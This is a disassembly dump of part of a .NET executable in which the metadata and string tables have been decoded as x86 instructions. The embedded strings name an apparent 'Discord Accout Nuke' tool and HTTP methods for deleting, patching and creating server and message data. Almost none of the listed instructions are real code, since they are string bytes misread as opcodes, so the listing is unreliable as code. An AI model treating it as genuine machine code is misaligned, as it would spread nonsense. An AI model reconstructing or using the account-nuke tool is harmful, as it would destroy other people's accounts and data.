  4038c2:	02 00                	add    (%eax),%al
  4038c4:	35 00 25 00 01       	xor    $0x1002500,%eax
  4038c9:	00 36                	add    %dh,(%esi)
  4038cb:	00 25 00 02 00 38    	add    %ah,0x38000200
  4038d1:	00 27                	add    %ah,(%edi)
  4038d3:	00 01                	add    %al,(%ecx)
  4038d5:	00 39                	add    %bh,(%ecx)
  4038d7:	00 27                	add    %ah,(%edi)
  4038d9:	00 02                	add    %al,(%edx)
  4038db:	00 3a                	add    %bh,(%edx)
  4038dd:	00 29                	add    %ch,(%ecx)
  4038df:	00 01                	add    %al,(%ecx)
  4038e1:	00 3b                	add    %bh,(%ebx)
  4038e3:	00 29                	add    %ch,(%ecx)
  4038e5:	00 02                	add    %al,(%edx)
  4038e7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4038ea:	2b 00                	sub    (%eax),%eax
  4038ec:	01 00                	add    %eax,(%eax)
  4038ee:	3d 00 2b 00 02       	cmp    $0x2002b00,%eax
  4038f3:	00 3e                	add    %bh,(%esi)
  4038f5:	00 2d 00 01 00 3f    	add    %ch,0x3f000100
  4038fb:	00 2d 00 02 00 40    	add    %ch,0x40000200
  403901:	00 2f                	add    %ch,(%edi)
  403903:	00 01                	add    %al,(%ecx)
  403905:	00 41 00             	add    %al,0x0(%ecx)
  403908:	2f                   	das
  403909:	00 02                	add    %al,(%edx)
  40390b:	00 42 00             	add    %al,0x0(%edx)
  40390e:	31 00                	xor    %eax,(%eax)
  403910:	01 00                	add    %eax,(%eax)
  403912:	43                   	inc    %ebx
  403913:	00 31                	add    %dh,(%ecx)
  403915:	00 02                	add    %al,(%edx)
  403917:	00 45 00             	add    %al,0x0(%ebp)
  40391a:	33 00                	xor    (%eax),%eax
  40391c:	01 00                	add    %eax,(%eax)
  40391e:	46                   	inc    %esi
  40391f:	00 33                	add    %dh,(%ebx)
  403921:	00 05 00 16 00 27    	add    %al,0x27001600
  403927:	00 05 00 18 00 29    	add    %al,0x29001800
  40392d:	00 06                	add    %al,(%esi)
  40392f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403932:	27                   	daa
  403933:	00 06                	add    %al,(%esi)
  403935:	00 1e                	add    %bl,(%esi)
  403937:	00 29                	add    %ch,(%ecx)
  403939:	00 5d 00             	add    %bl,0x0(%ebp)
  40393c:	b9 00 d2 00 e9       	mov    $0xe900d200,%ecx
  403941:	00 fb                	add    %bh,%bl
  403943:	00 54 01 5c          	add    %dl,0x5c(%ecx,%eax,1)
  403947:	01 8b 01 93 01 df    	add    %ecx,-0x20fe6cff(%ebx)
  40394d:	01 04 80             	add    %eax,(%eax,%eax,4)
  403950:	00 00                	add    %al,(%eax)
  403952:	01 00                	add    %eax,(%eax)
	...
  403960:	55                   	push   %ebp
  403961:	03 00                	add    (%eax),%eax
  403963:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40396e:	00 00                	add    %al,(%eax)
  403970:	23 02                	and    (%edx),%eax
  403972:	af                   	scas   %es:(%edi),%eax
  403973:	00 00                	add    %al,(%eax)
  403975:	00 00                	add    %al,(%eax)
  403977:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  403982:	00 00                	add    %al,(%eax)
  403984:	23 02                	and    (%edx),%eax
  403986:	f6 06 00             	testb  $0x0,(%esi)
  403989:	00 00                	add    %al,(%eax)
  40398b:	00 04 00             	add    %al,(%eax,%eax,1)
  40398e:	02 00                	add    (%eax),%al
	...
  403998:	2c 02                	sub    $0x2,%al
  40399a:	74 07                	je     0x4039a3
  40399c:	00 00                	add    %al,(%eax)
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	0c 00                	or     $0x0,%al
	...
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	35 02 4f 07 00       	xor    $0x74f02,%eax
  4039b1:	00 00                	add    %al,(%eax)
  4039b3:	00 05 00 03 00 06    	add    %al,0x6000300
  4039b9:	00 03                	add    %al,(%ebx)
  4039bb:	00 07                	add    %al,(%edi)
  4039bd:	00 04 00             	add    %al,(%eax,%eax,1)
  4039c0:	08 00                	or     %al,(%eax)
  4039c2:	04 00                	add    $0x0,%al
  4039c4:	09 00                	or     %eax,(%eax)
  4039c6:	04 00                	add    $0x0,%al
  4039c8:	0a 00                	or     (%eax),%al
  4039ca:	04 00                	add    $0x0,%al
  4039cc:	0b 00                	or     (%eax),%eax
  4039ce:	04 00                	add    $0x0,%al
  4039d0:	0c 00                	or     $0x0,%al
  4039d2:	04 00                	add    $0x0,%al
  4039d4:	49                   	dec    %ecx
  4039d5:	00 75 00             	add    %dh,0x0(%ebp)
  4039d8:	49                   	dec    %ecx
  4039d9:	00 88 00 5f 00 df    	add    %cl,-0x20ffa100(%eax)
  4039df:	00 5f 00             	add    %bl,0x0(%edi)
  4039e2:	4a                   	dec    %edx
  4039e3:	01 5f 00             	add    %ebx,0x0(%edi)
  4039e6:	81 01 93 00 f1 01    	addl   $0x1f10093,(%ecx)
  4039ec:	93                   	xchg   %eax,%ebx
  4039ed:	00 18                	add    %bl,(%eax)
  4039ef:	02 00                	add    (%eax),%al
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	00 00                	add    %al,(%eax)
  4039f5:	3c 50                	cmp    $0x50,%al
  4039f7:	61                   	popa
  4039f8:	74 63                	je     0x403a5d
  4039fa:	68 41 73 79 6e       	push   $0x6e797341
  4039ff:	63 3e                	arpl   %edi,(%esi)
  403a01:	64 5f                	fs pop %edi
  403a03:	5f                   	pop    %edi
  403a04:	30 00                	xor    %al,(%eax)
  403a06:	3c 6d                	cmp    $0x6d,%al
  403a08:	65 74 68             	gs je  0x403a73
  403a0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0c:	64 3e 35 5f 5f 31 00 	fs ds xor $0x315f5f,%eax
  403a13:	3c 50                	cmp    $0x50,%al
  403a15:	75 74                	jne    0x403a8b
  403a17:	41                   	inc    %ecx
  403a18:	73 79                	jae    0x403a93
  403a1a:	6e                   	outsb  %ds:(%esi),(%dx)
  403a1b:	63 3e                	arpl   %edi,(%esi)
  403a1d:	64 5f                	fs pop %edi
  403a1f:	5f                   	pop    %edi
  403a20:	31 00                	xor    %eax,(%eax)
  403a22:	3c 3e                	cmp    $0x3e,%al
  403a24:	75 5f                	jne    0x403a85
  403a26:	5f                   	pop    %edi
  403a27:	31 00                	xor    %eax,(%eax)
  403a29:	54                   	push   %esp
  403a2a:	61                   	popa
  403a2b:	73 6b                	jae    0x403a98
  403a2d:	60                   	pusha
  403a2e:	31 00                	xor    %eax,(%eax)
  403a30:	41                   	inc    %ecx
  403a31:	73 79                	jae    0x403aac
  403a33:	6e                   	outsb  %ds:(%esi),(%dx)
  403a34:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  403a38:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  403a3c:	68 6f 64 42 75       	push   $0x7542646f
  403a41:	69 6c 64 65 72 60 31 	imul   $0x316072,0x65(%esp,%eiz,2),%ebp
  403a48:	00 
  403a49:	54                   	push   %esp
  403a4a:	61                   	popa
  403a4b:	73 6b                	jae    0x403ab8
  403a4d:	41                   	inc    %ecx
  403a4e:	77 61                	ja     0x403ab1
  403a50:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  403a57:	4c 
  403a58:	69 73 74 60 31 00 3c 	imul   $0x3c003160,0x74(%ebx),%esi
  403a5f:	72 65                	jb     0x403ac6
  403a61:	71 75                	jno    0x403ad8
  403a63:	65 73 74             	gs jae 0x403ada
  403a66:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  403a6c:	3c 72                	cmp    $0x72,%al
  403a6e:	65 73 70             	gs jae 0x403ae1
  403a71:	6f                   	outsl  %ds:(%esi),(%dx)
  403a72:	6e                   	outsb  %ds:(%esi),(%dx)
  403a73:	73 65                	jae    0x403ada
  403a75:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  403a7b:	3c 3e                	cmp    $0x3e,%al
  403a7d:	73 5f                	jae    0x403ade
  403a7f:	5f                   	pop    %edi
  403a80:	34 00                	xor    $0x0,%al
  403a82:	67 65 74 5f          	addr16 gs je 0x403ae5
  403a86:	55                   	push   %ebp
  403a87:	54                   	push   %esp
  403a88:	46                   	inc    %esi
  403a89:	38 00                	cmp    %al,(%eax)
  403a8b:	3c 4d                	cmp    $0x4d,%al
  403a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a8e:	64 75 6c             	fs jne 0x403afd
  403a91:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  403a96:	73 74                	jae    0x403b0c
  403a98:	65 6d                	gs insl (%dx),%es:(%edi)
  403a9a:	2e 49                	cs dec %ecx
  403a9c:	4f                   	dec    %edi
  403a9d:	00 48 54             	add    %cl,0x54(%eax)
  403aa0:	54                   	push   %esp
  403aa1:	50                   	push   %eax
  403aa2:	00 6d 73             	add    %ch,0x73(%ebp)
  403aa5:	63 6f 72             	arpl   %ebp,0x72(%edi)
  403aa8:	6c                   	insb   (%dx),%es:(%edi)
  403aa9:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  403ab0:	65 6d                	gs insl (%dx),%es:(%edi)
  403ab2:	2e 43                	cs inc %ebx
  403ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab5:	6c                   	insb   (%dx),%es:(%edi)
  403ab6:	6c                   	insb   (%dx),%es:(%edi)
  403ab7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403abc:	6e                   	outsb  %ds:(%esi),(%dx)
  403abd:	73 2e                	jae    0x403aed
  403abf:	47                   	inc    %edi
  403ac0:	65 6e                	outsb  %gs:(%esi),(%dx)
  403ac2:	65 72 69             	gs jb  0x403b2e
  403ac5:	63 00                	arpl   %eax,(%eax)
  403ac7:	53                   	push   %ebx
  403ac8:	65 6e                	outsb  %gs:(%esi),(%dx)
  403aca:	64 41                	fs inc %ecx
  403acc:	73 79                	jae    0x403b47
  403ace:	6e                   	outsb  %ds:(%esi),(%dx)
  403acf:	63 00                	arpl   %eax,(%eax)
  403ad1:	44                   	inc    %esp
  403ad2:	65 6c                	gs insb (%dx),%es:(%edi)
  403ad4:	65 74 65             	gs je  0x403b3c
  403ad7:	41                   	inc    %ecx
  403ad8:	73 79                	jae    0x403b53
  403ada:	6e                   	outsb  %ds:(%esi),(%dx)
  403adb:	63 00                	arpl   %eax,(%eax)
  403add:	52                   	push   %edx
  403ade:	65 61                	gs popa
  403ae0:	64 41                	fs inc %ecx
  403ae2:	73 53                	jae    0x403b37
  403ae4:	74 72                	je     0x403b58
  403ae6:	69 6e 67 41 73 79 6e 	imul   $0x6e797341,0x67(%esi),%ebp
  403aed:	63 00                	arpl   %eax,(%eax)
  403aef:	50                   	push   %eax
  403af0:	61                   	popa
  403af1:	74 63                	je     0x403b56
  403af3:	68 41 73 79 6e       	push   $0x6e797341
  403af8:	63 00                	arpl   %eax,(%eax)
  403afa:	47                   	inc    %edi
  403afb:	65 74 41             	gs je  0x403b3f
  403afe:	73 79                	jae    0x403b79
  403b00:	6e                   	outsb  %ds:(%esi),(%dx)
  403b01:	63 00                	arpl   %eax,(%eax)
  403b03:	50                   	push   %eax
  403b04:	6f                   	outsl  %ds:(%esi),(%dx)
  403b05:	73 74                	jae    0x403b7b
  403b07:	41                   	inc    %ecx
  403b08:	73 79                	jae    0x403b83
  403b0a:	6e                   	outsb  %ds:(%esi),(%dx)
  403b0b:	63 00                	arpl   %eax,(%eax)
  403b0d:	50                   	push   %eax
  403b0e:	75 74                	jne    0x403b84
  403b10:	41                   	inc    %ecx
  403b11:	73 79                	jae    0x403b8c
  403b13:	6e                   	outsb  %ds:(%esi),(%dx)
  403b14:	63 00                	arpl   %eax,(%eax)
  403b16:	54                   	push   %esp
  403b17:	68 72 65 61 64       	push   $0x64616572
  403b1c:	00 41 64             	add    %al,0x64(%ecx)
  403b1f:	64 00 41 77          	add    %al,%fs:0x77(%ecx)
  403b23:	61                   	popa
  403b24:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  403b2b:	65 
  403b2c:	4f                   	dec    %edi
  403b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  403b2e:	43                   	inc    %ebx
  403b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  403b30:	6d                   	insl   (%dx),%es:(%edi)
  403b31:	70 6c                	jo     0x403b9f
  403b33:	65 74 65             	gs je  0x403b9b
  403b36:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  403b3a:	74 5f                	je     0x403b9b
  403b3c:	49                   	dec    %ecx
  403b3d:	73 43                	jae    0x403b82
  403b3f:	6f                   	outsl  %ds:(%esi),(%dx)
  403b40:	6d                   	insl   (%dx),%es:(%edi)
  403b41:	70 6c                	jo     0x403baf
  403b43:	65 74 65             	gs je  0x403bab
  403b46:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  403b4a:	74 5f                	je     0x403bab
  403b4c:	6c                   	insb   (%dx),%es:(%edi)
  403b4d:	61                   	popa
  403b4e:	73 74                	jae    0x403bc4
  403b50:	5f                   	pop    %edi
  403b51:	6d                   	insl   (%dx),%es:(%edi)
  403b52:	65 73 73             	gs jae 0x403bc8
  403b55:	61                   	popa
  403b56:	67 65 5f             	addr16 gs pop %edi
  403b59:	69 64 00 73 65 74 5f 	imul   $0x6c5f7465,0x73(%eax,%eax,1),%esp
  403b60:	6c 
  403b61:	61                   	popa
  403b62:	73 74                	jae    0x403bd8
  403b64:	5f                   	pop    %edi
  403b65:	6d                   	insl   (%dx),%es:(%edi)
  403b66:	65 73 73             	gs jae 0x403bdc
  403b69:	61                   	popa
  403b6a:	67 65 5f             	addr16 gs pop %edi
  403b6d:	69 64 00 67 65 74 5f 	imul   $0x695f7465,0x67(%eax,%eax,1),%esp
  403b74:	69 
  403b75:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  403b79:	74 5f                	je     0x403bda
  403b7b:	69 64 00 3c 69 64 3e 	imul   $0x6b3e6469,0x3c(%eax,%eax,1),%esp
  403b82:	6b 
  403b83:	5f                   	pop    %edi
  403b84:	5f                   	pop    %edi
  403b85:	42                   	inc    %edx
  403b86:	61                   	popa
  403b87:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403b8a:	6e                   	outsb  %ds:(%esi),(%dx)
  403b8b:	67 46                	addr16 inc %esi
  403b8d:	69 65 6c 64 00 3c 6c 	imul   $0x6c3c0064,0x6c(%ebp),%esp
  403b94:	61                   	popa
  403b95:	73 74                	jae    0x403c0b
  403b97:	5f                   	pop    %edi
  403b98:	6d                   	insl   (%dx),%es:(%edi)
  403b99:	65 73 73             	gs jae 0x403c0f
  403b9c:	61                   	popa
  403b9d:	67 65 5f             	addr16 gs pop %edi
  403ba0:	69 64 3e 6b 5f 5f 42 	imul   $0x61425f5f,0x6b(%esi,%edi,1),%esp
  403ba7:	61 
  403ba8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403bab:	6e                   	outsb  %ds:(%esi),(%dx)
  403bac:	67 46                	addr16 inc %esi
  403bae:	69 65 6c 64 00 3c 6e 	imul   $0x6e3c0064,0x6c(%ebp),%esp
  403bb5:	61                   	popa
  403bb6:	6d                   	insl   (%dx),%es:(%edi)
  403bb7:	65 3e 6b 5f 5f 42    	gs imul $0x42,%ds:0x5f(%edi),%ebx
  403bbd:	61                   	popa
  403bbe:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403bc1:	6e                   	outsb  %ds:(%esi),(%dx)
  403bc2:	67 46                	addr16 inc %esi
  403bc4:	69 65 6c 64 00 3c 6e 	imul   $0x6e3c0064,0x6c(%ebp),%esp
  403bcb:	69 63 6b 6e 61 6d 65 	imul   $0x656d616e,0x6b(%ebx),%esp
  403bd2:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  403bd7:	61                   	popa
  403bd8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403bdb:	6e                   	outsb  %ds:(%esi),(%dx)
  403bdc:	67 46                	addr16 inc %esi
  403bde:	69 65 6c 64 00 3c 75 	imul   $0x753c0064,0x6c(%ebp),%esp
  403be5:	73 65                	jae    0x403c4c
  403be7:	72 6e                	jb     0x403c57
  403be9:	61                   	popa
  403bea:	6d                   	insl   (%dx),%es:(%edi)
  403beb:	65 3e 6b 5f 5f 42    	gs imul $0x42,%ds:0x5f(%edi),%ebx
  403bf1:	61                   	popa
  403bf2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403bf5:	6e                   	outsb  %ds:(%esi),(%dx)
  403bf6:	67 46                	addr16 inc %esi
  403bf8:	69 65 6c 64 00 3c 74 	imul   $0x743c0064,0x6c(%ebp),%esp
  403bff:	79 70                	jns    0x403c71
  403c01:	65 3e 6b 5f 5f 42    	gs imul $0x42,%ds:0x5f(%edi),%ebx
  403c07:	61                   	popa
  403c08:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c0b:	6e                   	outsb  %ds:(%esi),(%dx)
  403c0c:	67 46                	addr16 inc %esi
  403c0e:	69 65 6c 64 00 3c 69 	imul   $0x693c0064,0x6c(%ebp),%esp
  403c15:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  403c18:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  403c1d:	61                   	popa
  403c1e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c21:	6e                   	outsb  %ds:(%esi),(%dx)
  403c22:	67 46                	addr16 inc %esi
  403c24:	69 65 6c 64 00 3c 61 	imul   $0x613c0064,0x6c(%ebp),%esp
  403c2b:	76 61                	jbe    0x403c8e
  403c2d:	74 61                	je     0x403c90
  403c2f:	72 3e                	jb     0x403c6f
  403c31:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403c35:	61                   	popa
  403c36:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c39:	6e                   	outsb  %ds:(%esi),(%dx)
  403c3a:	67 46                	addr16 inc %esi
  403c3c:	69 65 6c 64 00 3c 6f 	imul   $0x6f3c0064,0x6c(%ebp),%esp
  403c43:	77 6e                	ja     0x403cb3
  403c45:	65 72 3e             	gs jb  0x403c86
  403c48:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403c4c:	61                   	popa
  403c4d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c50:	6e                   	outsb  %ds:(%esi),(%dx)
  403c51:	67 46                	addr16 inc %esi
  403c53:	69 65 6c 64 00 3c 75 	imul   $0x753c0064,0x6c(%ebp),%esp
  403c5a:	73 65                	jae    0x403cc1
  403c5c:	72 3e                	jb     0x403c9c
  403c5e:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403c62:	61                   	popa
  403c63:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c66:	6e                   	outsb  %ds:(%esi),(%dx)
  403c67:	67 46                	addr16 inc %esi
  403c69:	69 65 6c 64 00 3c 64 	imul   $0x643c0064,0x6c(%ebp),%esp
  403c70:	69 73 63 72 69 6d 69 	imul   $0x696d6972,0x63(%ebx),%esi
  403c77:	6e                   	outsb  %ds:(%esi),(%dx)
  403c78:	61                   	popa
  403c79:	74 6f                	je     0x403cea
  403c7b:	72 3e                	jb     0x403cbb
  403c7d:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403c81:	61                   	popa
  403c82:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c85:	6e                   	outsb  %ds:(%esi),(%dx)
  403c86:	67 46                	addr16 inc %esi
  403c88:	69 65 6c 64 00 3c 66 	imul   $0x663c0064,0x6c(%ebp),%esp
  403c8f:	65 61                	gs popa
  403c91:	74 75                	je     0x403d08
  403c93:	72 65                	jb     0x403cfa
  403c95:	73 3e                	jae    0x403cd5
  403c97:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403c9b:	61                   	popa
  403c9c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403c9f:	6e                   	outsb  %ds:(%esi),(%dx)
  403ca0:	67 46                	addr16 inc %esi
  403ca2:	69 65 6c 64 00 3c 70 	imul   $0x703c0064,0x6c(%ebp),%esp
  403ca9:	75 62                	jne    0x403d0d
  403cab:	6c                   	insb   (%dx),%es:(%edi)
  403cac:	69 63 5f 66 6c 61 67 	imul   $0x67616c66,0x5f(%ebx),%esp
  403cb3:	73 3e                	jae    0x403cf3
  403cb5:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403cb9:	61                   	popa
  403cba:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403cbd:	6e                   	outsb  %ds:(%esi),(%dx)
  403cbe:	67 46                	addr16 inc %esi
  403cc0:	69 65 6c 64 00 3c 70 	imul   $0x703c0064,0x6c(%ebp),%esp
  403cc7:	65 72 6d             	gs jb  0x403d37
  403cca:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  403cd1:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  403cd6:	61                   	popa
  403cd7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403cda:	6e                   	outsb  %ds:(%esi),(%dx)
  403cdb:	67 46                	addr16 inc %esi
  403cdd:	69 65 6c 64 00 3c 72 	imul   $0x723c0064,0x6c(%ebp),%esp
  403ce4:	65 63 69 70          	arpl   %ebp,%gs:0x70(%ecx)
  403ce8:	69 65 6e 74 73 3e 6b 	imul   $0x6b3e7374,0x6e(%ebp),%esp
  403cef:	5f                   	pop    %edi
  403cf0:	5f                   	pop    %edi
  403cf1:	42                   	inc    %edx
  403cf2:	61                   	popa
  403cf3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  403cf7:	67 46                	addr16 inc %esi
  403cf9:	69 65 6c 64 00 3c 4d 	imul   $0x4d3c0064,0x6c(%ebp),%esp
  403d00:	79 41                	jns    0x403d43
  403d02:	72 72                	jb     0x403d76
  403d04:	61                   	popa
  403d05:	79 3e                	jns    0x403d45
  403d07:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  403d0b:	61                   	popa
  403d0c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  403d10:	67 46                	addr16 inc %esi
  403d12:	69 65 6c 64 00 48 74 	imul   $0x74480064,0x6c(%ebp),%esp
  403d19:	74 70                	je     0x403d8b
  403d1b:	4d                   	dec    %ebp
  403d1c:	65 74 68             	gs je  0x403d87
  403d1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403d20:	64 00 48 74          	add    %cl,%fs:0x74(%eax)
  403d24:	74 70                	je     0x403d96
  403d26:	52                   	push   %edx
  403d27:	65 73 70             	gs jae 0x403d9a
  403d2a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d2b:	6e                   	outsb  %ds:(%esi),(%dx)
  403d2c:	73 65                	jae    0x403d93
  403d2e:	4d                   	dec    %ebp
  403d2f:	65 73 73             	gs jae 0x403da5
  403d32:	61                   	popa
  403d33:	67 65 00 48 74       	add    %cl,%gs:0x74(%bx,%si)
  403d38:	74 70                	je     0x403daa
  403d3a:	52                   	push   %edx
  403d3b:	65 71 75             	gs jno 0x403db3
  403d3e:	65 73 74             	gs jae 0x403db5
  403d41:	4d                   	dec    %ebp
  403d42:	65 73 73             	gs jae 0x403db8
  403d45:	61                   	popa
  403d46:	67 65 00 44 69       	add    %al,%gs:0x69(%si)
  403d4b:	73 63                	jae    0x403db0
  403d4d:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4e:	72 64                	jb     0x403db4
  403d50:	20 41 63             	and    %al,0x63(%ecx)
  403d53:	63 6f 75             	arpl   %ebp,0x75(%edi)
  403d56:	74 20                	je     0x403d78
  403d58:	4e                   	dec    %esi
  403d59:	75 6b                	jne    0x403dc6
  403d5b:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  403d60:	63 6f 72             	arpl   %ebp,0x72(%edi)
  403d63:	64 5f                	fs pop %edi
  403d65:	41                   	inc    %ecx
  403d66:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  403d69:	75 74                	jne    0x403ddf
  403d6b:	5f                   	pop    %edi
  403d6c:	4e                   	dec    %esi
  403d6d:	75 6b                	jne    0x403dda
  403d6f:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
  403d73:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  403d7a:	6c                   	insb   (%dx),%es:(%edi)
  403d7b:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  403d80:	6e                   	outsb  %ds:(%esi),(%dx)
  403d81:	6c                   	insb   (%dx),%es:(%edi)
  403d82:	6f                   	outsl  %ds:(%esi),(%dx)
  403d83:	61                   	popa
  403d84:	64 46                	fs inc %esi
  403d86:	69 6c 65 00 43 6f 6e 	imul   $0x736e6f43,0x0(%ebp,%eiz,2),%ebp
  403d8d:	73 
  403d8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403d8f:	6c                   	insb   (%dx),%es:(%edi)
  403d90:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  403d94:	74 5f                	je     0x403df5
  403d96:	54                   	push   %esp
  403d97:	69 74 6c 65 00 67 65 	imul   $0x74656700,0x65(%esp,%ebp,2),%esi
  403d9e:	74 
  403d9f:	5f                   	pop    %edi
  403da0:	6e                   	outsb  %ds:(%esi),(%dx)
  403da1:	61                   	popa
  403da2:	6d                   	insl   (%dx),%es:(%edi)
  403da3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  403da7:	74 5f                	je     0x403e08
  403da9:	6e                   	outsb  %ds:(%esi),(%dx)
  403daa:	61                   	popa
  403dab:	6d                   	insl   (%dx),%es:(%edi)
  403dac:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  403db0:	74 5f                	je     0x403e11
  403db2:	6e                   	outsb  %ds:(%esi),(%dx)
  403db3:	69 63 6b 6e 61 6d 65 	imul   $0x656d616e,0x6b(%ebx),%esp
  403dba:	00 73 65             	add    %dh,0x65(%ebx)
  403dbd:	74 5f                	je     0x403e1e
  403dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  403dc0:	69 63 6b 6e 61 6d 65 	imul   $0x656d616e,0x6b(%ebx),%esp
  403dc7:	00 67 65             	add    %ah,0x65(%edi)
  403dca:	74 5f                	je     0x403e2b
  403dcc:	75 73                	jne    0x403e41
  403dce:	65 72 6e             	gs jb  0x403e3f
  403dd1:	61                   	popa
  403dd2:	6d                   	insl   (%dx),%es:(%edi)
  403dd3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  403dd7:	74 5f                	je     0x403e38
  403dd9:	75 73                	jne    0x403e4e
  403ddb:	65 72 6e             	gs jb  0x403e4c
  403dde:	61                   	popa
  403ddf:	6d                   	insl   (%dx),%es:(%edi)
  403de0:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  403de4:	61                   	popa
  403de5:	64 4c                	fs dec %esp
  403de7:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  403dee:	74 65                	je     0x403e55
  403df0:	4c                   	dec    %esp
  403df1:	69 6e 65 00 49 41 73 	imul   $0x73414900,0x65(%esi),%ebp
  403df8:	79 6e                	jns    0x403e68
  403dfa:	63 53 74             	arpl   %edx,0x74(%ebx)
  403dfd:	61                   	popa
  403dfe:	74 65                	je     0x403e65
  403e00:	4d                   	dec    %ebp
  403e01:	61                   	popa
  403e02:	63 68 69             	arpl   %ebp,0x69(%eax)
  403e05:	6e                   	outsb  %ds:(%esi),(%dx)
  403e06:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  403e0a:	74 53                	je     0x403e5f
  403e0c:	74 61                	je     0x403e6f
  403e0e:	74 65                	je     0x403e75
  403e10:	4d                   	dec    %ebp
  403e11:	61                   	popa
  403e12:	63 68 69             	arpl   %ebp,0x69(%eax)
  403e15:	6e                   	outsb  %ds:(%esi),(%dx)
  403e16:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  403e1a:	61                   	popa
  403e1b:	74 65                	je     0x403e82
  403e1d:	4d                   	dec    %ebp
  403e1e:	61                   	popa
  403e1f:	63 68 69             	arpl   %ebp,0x69(%eax)
  403e22:	6e                   	outsb  %ds:(%esi),(%dx)
  403e23:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  403e28:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  403e2c:	74 5f                	je     0x403e8d
  403e2e:	74 79                	je     0x403ea9
  403e30:	70 65                	jo     0x403e97
  403e32:	00 73 65             	add    %dh,0x65(%ebx)
  403e35:	74 5f                	je     0x403e96
  403e37:	74 79                	je     0x403eb2
  403e39:	70 65                	jo     0x403ea0
  403e3b:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  403e3f:	70 6f                	jo     0x403eb0
  403e41:	73 65                	jae    0x403ea8
  403e43:	00 53 65             	add    %dl,0x65(%ebx)
  403e46:	72 76                	jb     0x403ebe
  403e48:	65 72 43             	gs jb  0x403e8e
  403e4b:	72 65                	jb     0x403eb2
  403e4d:	61                   	popa
  403e4e:	74 65                	je     0x403eb5
  403e50:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  403e54:	75 67                	jne    0x403ebd
  403e56:	67 65 72 42          	addr16 gs jb 0x403e9c
  403e5a:	72 6f                	jb     0x403ecb
  403e5c:	77 73                	ja     0x403ed1
  403e5e:	61                   	popa
  403e5f:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  403e63:	74 61                	je     0x403ec6
